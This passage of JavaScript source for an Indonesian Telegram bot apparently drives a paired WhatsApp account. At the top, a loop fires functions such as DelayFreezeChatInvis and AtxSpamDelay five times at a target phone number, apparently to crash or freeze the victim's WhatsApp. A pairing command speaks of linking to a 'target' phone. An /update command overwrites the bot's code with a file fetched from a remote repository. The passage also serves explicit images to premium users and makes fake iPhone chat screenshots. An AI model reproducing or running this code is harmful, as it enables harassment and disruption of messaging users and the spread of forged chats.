          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.red(`[ SENDING BLANK CLICK ANDRO TO: ${q} ]`)
        );
        await Conghard(sock, target);
        await DelayVisible(sock, target);
        await DelayExelion(sock, target);
        await DelayFreezeChatInvis(sock, target);
        await AtxSpamDelay(sock, target);
        await sleep(1000);
      }
    })();

  }
);

//==== Case All Owner Menu ====\\
//==== Case Update ====\\
const filePath = path.resolve(__dirname, "main.js");
const repoRaw = "https://raw.githubusercontent.com/AzamzChiverzz/database/main/index.js";

bot.command("update", async (ctx) => {
  try {
    if (!OWNER_IDS.map(String).includes(String(ctx.from.id))) {
      return ctx.reply("❌ Khusus owner");
    }

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/d5cvzs.jpg",
      {
        caption: "⏳ Sedang mengupdate script..."
      }
    );

    const { data } = await axios.get(repoRaw, {
      timeout: 10000
    });

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    // Hapus isi file lama dan ganti dengan yang baru
    fs.writeFileSync(filePath, data, "utf8");

    await ctx.reply(
      "✅ Update berhasil!\n🔄 Bot akan restart..."
    );

    setTimeout(() => {
      process.exit(0);
    }, 2000);

  } catch (err) {
    console.error(err);
    ctx.reply(`❌ Update gagal:\n${err.message}`);
  }
});

//==== Case Block Cmd ====\\
bot.command("blockcmd", async (ctx) => {
  if (!ctx.chat.type.includes("group")) {
    return ctx.reply("❌ Hanya bisa digunakan di grup.");
  }

  const member = await ctx.getChatMember(ctx.from.id);

  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Khusus admin grup.");
  }

  const args = ctx.message.text.split(" ").slice(1);

  if (!args[0]) {
    return ctx.reply("Contoh:\n/blockcmd menu");
  }

  const cmd = "/" + args[0].replace("/", "").toLowerCase();
  const chatId = String(ctx.chat.id);

  const db = loadDB();

  if (!db.groupCmdBlock) db.groupCmdBlock = {};
  if (!db.groupCmdBlock[chatId]) db.groupCmdBlock[chatId] = [];

  if (db.groupCmdBlock[chatId].includes(cmd)) {
    return ctx.reply("⚠️ Command sudah diblokir.");
  }

  db.groupCmdBlock[chatId].push(cmd);

  saveDB(db);

  ctx.reply(`✅ Command ${cmd} berhasil diblokir di grup ini.`);
});

//==== Case Unblockcmd ====\\
bot.command("unblockcmd", async (ctx) => {
  if (!ctx.chat.type.includes("group")) {
    return ctx.reply("❌ Hanya bisa digunakan di grup.");
  }

  const member = await ctx.getChatMember(ctx.from.id);

  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Khusus admin grup.");
  }

  const args = ctx.message.text.split(" ").slice(1);

  if (!args[0]) {
    return ctx.reply("Contoh:\n/unblockcmd menu");
  }

  const cmd = "/" + args[0].replace("/", "").toLowerCase();
  const chatId = String(ctx.chat.id);

  const db = loadDB();

  if (!db.groupCmdBlock?.[chatId]) {
    return ctx.reply("⚠️ Tidak ada command yang diblokir.");
  }

  db.groupCmdBlock[chatId] =
    db.groupCmdBlock[chatId].filter(x => x !== cmd);

  saveDB(db);

  ctx.reply(`✅ Command ${cmd} berhasil dibuka.`);
});

//==== Case List Block Cmd ====\\
bot.command("listblockcmd", async (ctx) => {
  const db = loadDB();
  const chatId = String(ctx.chat.id);

  const blockedCommands =
    db.groupCmdBlock?.[chatId] || [];

  if (blockedCommands.length < 1) {
    return ctx.reply(
      "✅ Tidak ada command yang diblokir di grup ini."
    );
  }

  let text = "📋 LIST COMMAND DIBLOKIR\n\n";

  blockedCommands.forEach((cmd, index) => {
    text += `${index + 1}. ${cmd}\n`;
  });

  ctx.reply(text);
});

//---- Case Add Prem Grup ----\\
bot.command("addpremgrup", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");

    if (args.length < 2) {
      return ctx.reply(
        "❌ Format Salah!\n\nContoh:\n/addpremgrup -1001234567890"
      );
    }

    const groupId = args[1].trim();

    // Validasi ID grup Telegram
    if (!/^-\d+$/.test(groupId)) {
      return ctx.reply(
        "❌ ID grup tidak valid.\nContoh: -1001234567890"
      );
    }

    global.db ??= {};
    global.db.premiumGroups ??= [];

    if (global.db.premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Grup tersebut sudah premium.");
    }

    global.db.premiumGroups.push(groupId);

    return ctx.reply(
      `✅ Berhasil menambahkan grup premium.\n\n🆔 ID Grup: ${groupId}`
    );

  } catch (err) {
    console.error("ADDPREMGRUP ERROR:", err);
    return ctx.reply(
      "❌ Terjadi kesalahan saat menambahkan grup premium."
    );
  }
});
//---- Case Del Prem Grup ----\\
bot.command("delpremgrup", checkOwner, async (ctx) => {
  try {
    const groupId = ctx.chat.id.toString();

    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("❌ Grup ini bukan grup premium.");
    }

    premiumGroups = premiumGroups.filter(id => id !== groupId);
    saveJSON(premiumGroupFile, premiumGroups);

    return ctx.reply("✅ Status premium grup ini berhasil dihapus.");

  } catch (err) {
    console.error("DELPREMGRUP ERROR:", err);
    return ctx.reply("❌ Terjadi kesalahan.");
  }
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, async (ctx) => {
  const replyMsg = ctx.message.reply_to_message;

  if (!replyMsg) {
    return ctx.reply(
      "❌ Reply pesan pengguna yang ingin dijadikan premium."
    );
  }

  const userId = replyMsg.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Pengguna ${userId} sudah memiliki akses premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  // Notifikasi ke user premium
  try {
    await ctx.telegram.sendMessage(
      userId,
      `🎉 Selamat! Anda telah ditambahkan sebagai pengguna Premium.

✨ Nikmati semua fitur premium yang tersedia di bot.
👑 Ditambahkan oleh: ${ctx.from.first_name}`
    );
  } catch (err) {
    console.log("Gagal mengirim pesan ke user:", err.message);
  }

  return ctx.reply(
    `✅ Pengguna ${userId} sekarang adalah premium.`
  );
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addbot", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!\n\nContoh:\n/addbot 628xxxxxxxxxx\n\nNote: Gunakan nomor tanpa tanda +"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");
  
  if (phoneNumber.length < 10) {
    return ctx.reply("❌ Nomor tidak valid! Minimal 10 digit angka.");
  }

  // Cek apakah sudah terhubung
  if (isWhatsAppConnected) {
    return ctx.replyWithHTML(`
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ ☇ Status : 🟢 TERHUBUNG
┃ ☇ Nomor  : ${linkedWhatsAppNumber || "Tidak diketahui"}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>

✅ WhatsApp sudah terhubung.
Gunakan /delbot terlebih dahulu jika ingin mengganti nomor.
`);
  }

  // Cek socket
  if (!sock) {
    return ctx.reply("❌ Socket WhatsApp belum siap, tunggu 5 detik lalu coba lagi...");
  }

  try {
    // Kirim pesan proses
    const processingMsg = await ctx.reply("⏳ Meminta kode pairing dari WhatsApp...");
    
    const code = await sock.requestPairingCode(phoneNumber, "AZAMGNTG");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    // Hapus pesan processing
    await ctx.deleteMessage(processingMsg.message_id).catch(() => {});

    const sentMsg = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ ☇ Status : 🟡 MENUNGGU
┃ ☇ Nomor  : ${phoneNumber}
┃ ☇ Code   : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>

⚠️ **CARA MENGHUBUNGKAN:**
1. Buka WhatsApp di HP target
2. Buka menu titik tiga (⋮) → Perangkat Tertaut
3. Pilih "Tautkan Perangkat"
4. Masukkan kode di atas

⏱️ Kode berlaku selama 5 menit.
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "❌ Hapus Pesan", callback_data: "close_pairing" },
            { text: "🔍 Cek Status", callback_data: "check_status" }
          ],
        ],
      },
    });

    pairingMessage = {
      chatId: sentMsg.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      code: formattedCode,
      timestamp: Date.now(),
    };
    
    // Auto hapus pairing message setelah 5 menit jika belum terhubung
    setTimeout(async () => {
      if (pairingMessage && !isWhatsAppConnected && pairingMessage.messageId === sentMsg.message_id) {
        try {
          await bot.telegram.editMessageCaption(
            pairingMessage.chatId,
            pairingMessage.messageId,
            undefined,
            `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ ☇ Status : ⏰ EXPIRED
┃ ☇ Nomor  : ${phoneNumber}
┃ ☇ Code   : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>

⏰ Kode pairing telah kadaluarsa.
Gunakan /addbot lagi untuk mendapatkan kode baru.
`,
            { parse_mode: "HTML" }
          );
          pairingMessage = null;
        } catch(e) {}
      }
    }, 5 * 60 * 1000);
    
  } catch (err) {
    console.error("Pairing error:", err);
    ctx.replyWithHTML(`
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ ☇ Status : ❌ GAGAL
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>

❌ Gagal melakukan pairing.
Error: ${err.message}

Kemungkinan penyebab:
• Nomor tidak valid
• Koneksi internet bermasalah
• Server WhatsApp sedang sibuk
`);
  }
});

// Handler untuk tombol close pairing
bot.action("close_pairing", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Hanya owner yang bisa menghapus!", { show_alert: true });
  }
  try {
    await ctx.deleteMessage();
    if (pairingMessage && pairingMessage.messageId === ctx.callbackQuery.message.message_id) {
      pairingMessage = null;
    }
    await ctx.answerCbQuery("Pesan dihapus!");
  } catch (error) {
    console.error("Gagal menghapus pesan:", error);
    await ctx.answerCbQuery("Gagal menghapus!", { show_alert: true });
  }
});

// Handler untuk cek status
bot.action("check_status", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Hanya owner!", { show_alert: true });
  }
  
  const status = isWhatsAppConnected ? "🟢 TERHUBUNG" : "🔴 TIDAK TERHUBUNG";
  const nomor = linkedWhatsAppNumber || "-";
  
  await ctx.answerCbQuery();
  await ctx.reply(`
📊 *STATUS KONEKSI WHATSAPP*

Status: ${status}
Nomor: ${nomor}
Uptime: ${getUptime()}
`, { parse_mode: "Markdown" });
});

// ========== COMMAND DELBOT (HAPUS SESSION) ==========
bot.command("delbot", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    isWhatsAppConnected = false;
    waStatus = "🔴 Tidak Terhubung";
    linkedWhatsAppNumber = "";
    pairingMessage = null;
    ctx.reply("✅ Session berhasil dihapus!\n\nGunakan /addbot untuk menghubungkan perangkat baru.");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);
    if (stat.isDirectory()) {
      const files = fs.readdirSync(sessionPath);
      files.forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }
    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

// ========== COMMAND STATUS ==========
// Command cek status lengkap
bot.command("status", checkOwner, async (ctx) => {
  const wastatus = isWhatsAppConnected ? "🟢 TERHUBUNG" : "🔴 TIDAK TERHUBUNG";
  const nomor = linkedWhatsAppNumber || "-";

  const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Status Koneksi : ${wastatus}
┃ ⌬ Nomor Aktif    : ${linkedWhatsAppNumber || "-"}
┃ ⌬ Uptime Bot     : ${getUptime()}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;
  await ctx.reply(message, { parse_mode: "HTML" });
});

//==== Case Anti Culik ====\\
bot.on("my_chat_member", async (ctx) => {
  try {
    if (!global.antiCulik) return;

    const chat = ctx.chat;
    const adder = ctx.update.my_chat_member.from;
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (
      (status === "member" || status === "administrator") &&
      (chat.type === "group" || chat.type === "supergroup")
    ) {
      const isOwner = OWNER_IDS.includes(String(adder.id));

      if (!isOwner) {
        await ctx.telegram.sendMessage(
          chat.id,
          "❌ Anti Culik Aktif!\n\nHanya owner yang dapat menambahkan bot ke grup."
        );

        await ctx.telegram.leaveChat(chat.id);
      }
    }
  } catch (err) {
    console.error(err);
  }
});

bot.command("anticulik", checkOwner, async (ctx) => {
  const status = global.antiCulik ? "Aktif ✅" : "Nonaktif ❌";

  await ctx.reply(
    `⚙️ PENGATURAN ANTI CULIK\n\nStatus Saat Ini: ${status}\n\nSilahkan pilih tombol di bawah.`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ ON", callback_data: "anticulik_on" },
            { text: "❌ OFF", callback_data: "anticulik_off" }
          ]
        ]
      }
    }
  );
});

// Anti Culik On
bot.action("anticulik_on", checkOwner, async (ctx) => {
  global.antiCulik = true;

  await ctx.answerCbQuery("Berhasil Mengaktifkan Anti Culik");

  await ctx.editMessageText(
    `⚙️ PENGATURAN ANTI CULIK\n\nStatus Saat Ini: Aktif ✅`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "❌ Matikan", callback_data: "anticulik_off" }
          ]
        ]
      }
    }
  );
});

//Anti Culik Off
bot.action("anticulik_off", checkOwner, async (ctx) => {
  global.antiCulik = false;

  await ctx.answerCbQuery("Berhasil Menonaktifkan Anti Culik");

  await ctx.editMessageText(
    `⚙️ PENGATURAN ANTI CULIK\n\nStatus Saat Ini: Nonaktif ❌`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Aktifkan", callback_data: "anticulik_on" }
          ]
        ]
      }
    }
  );
});

////////// Tools  \\\\\\\\\
const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]

//---- Case Addprem Button ----\\
bot.action(/addprem_(\d+)_(\d+)$/, async (ctx) => {
  const days = parseInt(ctx.match[1]);
  const userId = ctx.match[2];

  if (premiumUsers.includes(userId)) {
    return ctx.answerCbQuery("User sudah premium!");
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  let expiredText = "Permanent";

  if (days > 0) {
    const expired = Date.now() + (days * 24 * 60 * 60 * 1000);

    premiumExpiry[userId] = expired;
    saveJSON(premiumExpiryFile, premiumExpiry);

    expiredText = `${days} Hari`;
  }

  const user =
    ctx.update.callback_query.message.reply_to_message?.from ||
    ctx.update.callback_query.from;

  await ctx.editMessageText(`
✅ *PREMIUM BERHASIL DITAMBAHKAN*

👤 Nama: ${user.first_name || "-"}
🆔 ID: \`${userId}\`
⏳ Durasi: ${expiredText}

🎉 Pengguna sekarang memiliki akses Premium.
  `, {
    parse_mode: "Markdown"
  });

  await ctx.answerCbQuery("Premium berhasil ditambahkan!");
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];

  if (!url)
    return ctx.reply("❌ Gunakan:\n/statuswebsite https://example.com");

  let target = url;
  if (!/^https?:\/\//i.test(target)) {
    target = "http://" + target;
  }

  const msg = await ctx.reply("🔍 Mengecek status website...");

  try {
    const start = Date.now();
    const res = await axios.get(target, {
      timeout: 8000,
      validateStatus: () => true
    });
    const ping = Date.now() - start;

    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
📡 Status: ${statusText}
📄 HTTP Code: ${res.status}
⏱ Response Time: ${ping} ms

✅ Website masih bisa diakses Jier😭🗿😌`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
`🌐 *STATUS WEBSITE*

🔗 URL: ${target}
🔴 Status: DOWN WKWKWK
⏱ Timeout / No Response

❌ Website tidak dapat diakses mampus`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return ctx.reply(
      "❌ Cara pakai:\nReply kode JS lalu ketik:\n/cekfunc"
    );
  }

  const code = ctx.message.reply_to_message.text;

  // Bungkus biar async aman
  const wrappedCode = `
    (async () => {
      ${code}
    })();
  `;

  try {
    // SYNTAX CHECK ONLY
    new vm.Script(wrappedCode);

    // SUCCESS RESPONSE
    const successMsg = `\`\`\`js
🟢 <b>SYNTAX CHECK: PASSED</b>

✅ <b>Status:</b> Aman, tidak ditemukan error syntax
🧠 <b>Parser:</b> Node.js V8 Engine
📦 <b>Mode:</b> Async Function Wrapper
🔐 <b>Execution:</b> Diblokir (Syntax-only)

📊 <b>Analisis Singkat:</b>
• Struktur kode valid
• Kurung & scope seimbang
• Keyword JavaScript dikenali
• Siap dieksekusi tanpa crash syntax

🚀 <b>Kesimpulan:</b>
Kode lu <i>clean</i>, <i>aman</i>, dan <i>lanjut ke tahap logic</i>.
Gagah Si Eta, developer 😎🔥
\`\`\``;

    return ctx.reply(successMsg, { parse_mode: "Markdown" });

  } catch (err) {
    // ERROR RESPONSE
    const errorMsg = `\`\`\`js
🔴 <b>SYNTAX ERROR DETECTED</b>

❌ <b>Status:</b> Gagal parse kode
🧠 <b>Engine:</b> Node.js V8
📍 <b>Error Type:</b> ${err.name}

🧾 <b>Detail Pesan:</b>
<pre>${err.message}</pre>

🛠️ <b>Kemungkinan Penyebab:</b>
• Kurung <code>() {} []</code> tidak seimbang
• Salah penempatan <code>async / await</code>
• Typo keyword JavaScript
• Karakter ilegal / tidak tertutup

📌 <b>Saran:</b>
Periksa baris terakhir yang kamu edit, biasanya error muncul dari sana.
Perbaiki dulu, lalu jalankan <code>/cekfunc</code> ulang.

💀 <i>Fix it, then we talk again.</i>
\`\`\``;

    return ctx.reply(errorMsg, { parse_mode: "Markdown" });
  }
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat @Widixkecew01", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("[$] Example: /play WidixMusic Teduh")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Likz Ganteng|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

bot.command("cekid", async (ctx) => {
    const reply = ctx.message.reply_to_message;

    // Cek apakah ada reply
    if (reply) {
      const user = reply.from;
      const id = `\`${user.id}\``;
      const username = user.username ? `@${user.username}` : "(tidak ada username)";
      return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
    }

    // Jika tidak ada reply, ambil dari pengirim command
    const user = ctx.message.from;
    const id = `\`${user.id}\``;
    const username = user.username ? `@${user.username}` : "(tidak ada username)";
    return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
  });

bot.command(["toanime", "jadianime"], async (ctx) => {
    try {
      const message = ctx.message;
      const reply = message?.reply_to_message;

      if (!reply || !reply.photo) {
        return ctx.reply("❌ Balas foto yang ingin diubah menjadi anime.");
      }

